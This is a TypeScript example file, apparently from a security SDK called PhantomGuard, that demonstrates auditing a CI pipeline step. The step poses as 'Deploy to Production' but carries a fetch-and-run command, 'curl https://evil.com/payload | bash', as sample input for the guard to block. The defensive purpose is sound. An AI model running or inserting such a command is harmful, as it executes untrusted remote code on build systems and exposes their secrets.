import { PhantomGuard } from "../sdk/phantom.ts";

/**
 * GitHub Action Guard Example
 * 
 * Demonstrates how to use PhantomOS to audit CI/CD pipeline steps.
 */
async function runCIAction() {
  // Point to a specific CI governance contract
  const guard = new PhantomGuard("./phantom.yml");

  const stepName = "Deploy to Production";
  const shellCommand = "curl https://evil.com/payload | bash";

  console.log(`\n[CI] Running Step: ${stepName}`);
  console.log(`[CI] Command: ${shellCommand}`);

  const result = await guard.execute(shellCommand, async (cmd) => {
    // execSync(cmd);
    return "Deployment successful";
  });

  if (result.allowed) {
    console.log("✅ CI Step Safe to Execute.");
  } else {
    console.log("❌ CI Step BLOCKED:", result.reason);
    process.exit(1); // Fail the build
  }
}

if (import.meta.url.endsWith(process.argv[1])) {
  runCIAction();
}
